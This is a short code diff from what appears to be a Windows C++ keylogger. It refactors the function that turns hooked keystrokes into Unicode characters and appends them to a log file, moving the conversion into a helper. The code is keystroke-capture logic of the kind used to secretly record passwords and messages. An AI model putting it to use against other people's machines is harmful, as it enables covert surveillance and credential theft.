@@ -29,21 +29,7 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
     }
     else
     {
-        // Get the current keyboard state for the virtual-key code conversion.
-        BYTE state[KEYBOARD_STATE_SIZE];
-        keyboard::get_state(state);
-
-        // Convert the virtual-key code to the respective characters based off the
-        // keyboard layout and the current keyboard state.
-        WCHAR key_buffer[PWSZ_BUFFER_SIZE];
-        const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state,
-                                      key_buffer, PWSZ_BUFFER_SIZE, 0);
-
-        // If the conversion was successful, write the characters.
-        if (result > 0)
-        {
-            out_file << key_buffer;
-        }
+        out_file << keyboard::kbd_to_unicode(kbd_hook);
     }
 
     // Write all changes to the wofstream.
